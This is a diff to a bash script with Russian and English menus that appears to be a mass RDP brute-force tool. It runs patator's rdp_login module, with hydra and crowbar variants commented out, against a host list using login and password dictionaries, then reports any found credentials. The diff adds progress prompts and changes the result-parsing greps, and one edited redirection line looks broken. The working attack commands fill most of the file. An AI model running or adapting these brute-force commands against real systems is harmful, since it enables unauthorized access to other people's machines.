@@ -11,7 +11,7 @@ grey="\033[1;37m"
 ##########################################CLEAR#######################################
 CLEARALL ()
 {
-rm -rf Results/ paused.conf list 2> /dev/null
+rm -rf Results/ paused.conf 2 list> /dev/null
 }
 ########################################TESTROOT######################################
 TESTROOT()
@@ -46,7 +46,8 @@ CHECKDEPEND ()
 echo -e "                    $yellow*Проверяем зависимости.. Check dependencies"
 depend=$(dpkg -s freerdp-x11 | grep 'Status' | awk -F':' '/Status: / {print $2}')
 	if [ "$depend" = " install ok installed" ]; then
-		clear
+		clear 
+			
 		echo -e "                    $yellow*Проверяем зависимости.. Check dependencies$colorbase..OK"
 			else
 			echo ""
@@ -322,6 +323,8 @@ read -p "*Укажите путь к файлу со списком пароле
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
+echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] => $green"
+echo "" 
 python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
@@ -342,6 +345,8 @@ read -p "*Укажите путь к файлу со списком логино
 read -p "*Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
 clear
 echo -e "                               $green Запуск брутфорса"
+echo ""
+echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
 echo ""
 python patator.py rdp_login host=FILE0 user=FILE1 password=$passbrute 0=open3389 1=users -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open
@@ -364,6 +369,8 @@ read -p "*Укажите путь к файлу со списком пароле
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
+echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
+echo ""
 python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open
 #hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
@@ -382,6 +389,8 @@ if [ "$brutmenu" = "4" ]; then
 
 clear
 echo -e "                               $green Запуск брутфорса"
+echo ""
+echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
 echo ""
 python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dictionary/pass -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -U $PWD/users  -C $PWD/dictionary/pass -S $PWD/open 
@@ -430,6 +439,8 @@ read -p "*Enter the path to the file with a list of passwords {'/home/dictionary
 clear
 echo -e "                              $green Start bruteforceing"
 echo ""
+echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=>$green "
+echo ""
 python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
@@ -449,6 +460,8 @@ read -p "*Enter the path to username dictionary {'/home/dictionary/users'}: " lo
 read -p "*Enter the password {administrator, admin, 123456 & etc.} : " passbrute
 clear
 echo -e "                              $green Start bruteforceing"
+echo ""
+echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
 echo ""
 python patator.py rdp_login host=FILE0 user=FILE1 password=$passbrute 0=open3389 1=users -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
@@ -470,6 +483,8 @@ read -p "*Enter the path to passwords dictionary {'/home/dictionary/pass'}: " pa
 clear
 echo -e "                              $green Start bruteforceing"
 echo ""
+echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
+echo ""
 python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
@@ -486,6 +501,8 @@ fi
 if [ "$brutmenu" = "4" ]; then
 clear
 echo -e "                              $green Start bruteforceing "
+echo ""
+echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
 echo ""
 python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dictionary/pass -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -U $PWD/users -C $PWD/dictionary/pass -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
@@ -20365,11 +20382,12 @@ fi
 TESTRESULTRU ()
 {
 clear
-cat $PWD/Results/RUNTIME.log | grep -E '([0-9]{1,3}[\.]){3}[0-9]{1,3}'> all_results
-if grep -E '([0-9]{1,3}[\.]){3}[0-9]{1,3}' all_results;
+cat $PWD/Results/RUNTIME.log | grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}|.*:'> all_results
+if grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}|.*:' all_results;
 	then
+	clear
 	echo ""
-	#cat all_results | grep -E '([0-9]{1,3}[\.]){3}[0-9]{1,3}'
+	#cat all_results | grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}|.*:'
 	echo ""
  echo -e "$colorbase                          +---------------------------+"
  echo -e "$colorbase                          |$red   Логин/Пароль найден!    $colorbase|";
@@ -20397,11 +20415,12 @@ fi
 TESTRESULTEN ()
 {
 clear
-cat $PWD/Results/RUNTIME.log | grep -E '([0-9]{1,3}[\.]){3}[0-9]{1,3}'> all_results
-if grep -E 'INFO - 0|([0-9]{1,3}[\.]){3}[0-9]{1,3}|:[*]:' all_results;
+cat $PWD/Results/RUNTIME.log | grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}|.*:' > all_results
+if grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}|.*:' all_results;
 	then
+	clear
 	echo ""
-	#cat all_results | grep -E 'INFO - 0|([0-9]{1,3}[\.]){3}[0-9]{1,3}|:[*]:'
+	#cat all_results | grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}|.*:'
  echo -e "$colorbase                          +-------------------------+"
  echo -e "$colorbase                          |$red  Login/Password found!  $colorbase|";
  echo -e           "                          +-------------------------+$red"
